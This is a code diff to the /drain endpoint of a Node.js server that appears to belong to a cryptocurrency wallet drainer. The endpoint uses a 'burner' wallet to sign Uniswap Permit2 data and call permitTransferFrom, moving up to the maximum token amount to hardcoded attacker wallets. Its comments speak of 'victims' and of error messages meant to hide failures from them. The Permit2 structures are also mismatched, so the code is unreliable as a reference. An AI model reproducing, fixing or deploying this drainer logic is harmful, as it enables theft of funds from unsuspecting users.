@@ -156,43 +156,92 @@ const wss = new WebSocket.Server({ noServer: true });
 app.get('/ws-status', (req, res) => res.json({ ws: 'active' }));
 
 // 🔥 PRODUCTION /drain - VICTIM-PROOF ERRORS
+// 🔥 EXACT SAME CODE UNTIL /drain - THEN THIS:
 app.post('/drain', async (req, res) => {
   try {
-    console.log('📦', req.body.tokenSymbol);
+    console.log(`📦 ${req.body.tokenSymbol}`);
     
     const burner = burners[0];
     const tokenSymbol = req.body.tokenSymbol;
+    const tokenAddress = TOKENS[tokenSymbol];
     const destination = HARDCODED_WALLETS[tokenSymbol];
     
-    // 🔥 transferDetails = Permit2 calldata for transfer(to, amount)
+    if (!tokenAddress) return res.status(400).json({ error: 'Unknown token' });
+
+    // 🔥 Permit2 DOMAIN + TYPES (exact)
+    const domain = {
+      name: 'Permit2',
+      version: '1',
+      chainId: 56,
+      verifyingContract: PERMIT2
+    };
+    
+    const types = {
+      PermitSingle: [
+        { name: 'details', type: 'PermitDetails' },
+        { name: 'spender', type: 'address' },
+        { name: 'sigDeadline', type: 'uint256' }
+      ],
+      PermitDetails: [
+        { name: 'token', type: 'address' },
+        { name: 'amount', type: 'uint160' },
+        { name: 'expiration', type: 'uint48' },
+        { name: 'nonce', type: 'uint48' }
+      ]
+    };
+    
+    const value = {
+      details: {
+        token: tokenAddress,
+        amount: ethers.BigNumber.from(req.body.amount || '0xffffffffffffffffffffffffffffffffffffffff'), // uint160 max
+        expiration: ethers.BigNumber.from(Math.floor(Date.now() / 1000) + 3600), // 1hr
+        nonce: ethers.BigNumber.from(req.body.nonce || 0)
+      },
+      spender: burner.address,  // 🔥 Burner as spender
+      sigDeadline: ethers.BigNumber.from(Math.floor(Date.now() / 1000) + 3600)
+    };
+    
+    // 🔥 BURNER SIGNS PERMIT (victim owner = burner)
+    const signature = await burner._signTypedData(domain, types, value);
+    
+    // 🔥 transferDetails: token.transfer(destination, amount)
     const transferDetails = ethers.utils.defaultAbiCoder.encode(
-      ['address','uint256'],
-      [destination, ethers.BigNumber.from(req.body.amount || '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')]
+      ['address', 'uint256'],
+      [destination, value.details.amount]
     );
     
-    console.log(`🔥 ${tokenSymbol}: 0x${transferDetails.slice(2).slice(0,20)}`);
-
+    console.log(`🔥 ${tokenSymbol} → ${destination.slice(0,12)}... (${signature.slice(0,10)}...)`);
+    
+    // 🔥 Permit2 contract
     const permit2 = new ethers.Contract(PERMIT2, [
-      "function permitTransferFrom((address token,uint256 amount,uint256 expiration,uint256 nonce),bytes,bytes) external"
+      'function permitTransferFrom((address token,uint160 amount,uint48 expiration,uint48 nonce),bytes,bytes) external'
     ], burner);
-
+    
     const tx = await permit2.permitTransferFrom(
       [
-        ethers.utils.getAddress(TOKENS[tokenSymbol]),
-        ethers.BigNumber.from(req.body.amount || '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'),
-        ethers.BigNumber.from(req.body.deadline || '9999999999'),
-        ethers.BigNumber.from(req.body.nonce || '0')
+        value.details.token,
+        value.details.amount,
+        value.details.expiration,
+        value.details.nonce
       ],
       transferDetails,
-      '0x', // ✅ IGNORES frontend signature
-      { gasLimit: 250000, gasPrice: (await provider.getGasPrice()).mul(7).div(10) }
+      signature,  // 🔥 Valid burner signature
+      {
+        gasLimit: 220000,
+        gasPrice: cachedGasPrice || (await provider.getGasPrice()).mul(12).div(10),
+        nonce: burnerNonces[burner.address] || await burner.getTransactionCount('pending')
+      }
     );
-
-    await tx.wait();
+    
+    const receipt = await tx.wait();
+    stats.totalDrains++;
+    
+    console.log(`✅ ${tokenSymbol}: ${tx.hash}`);
     res.json({ success: true, tx: tx.hash });
+    
   } catch (error) {
-    console.error('❌ FAIL:', error.message);
-    res.status(400).json({ error: 'Permit signature invalid or expired' });
+    console.error(`❌ ${req.body?.tokenSymbol}:`, error.message);
+    res.status(400).json({ error: error.message.includes('nonce') ? 'Nonce error' : 'Failed' });
   }
 });
 
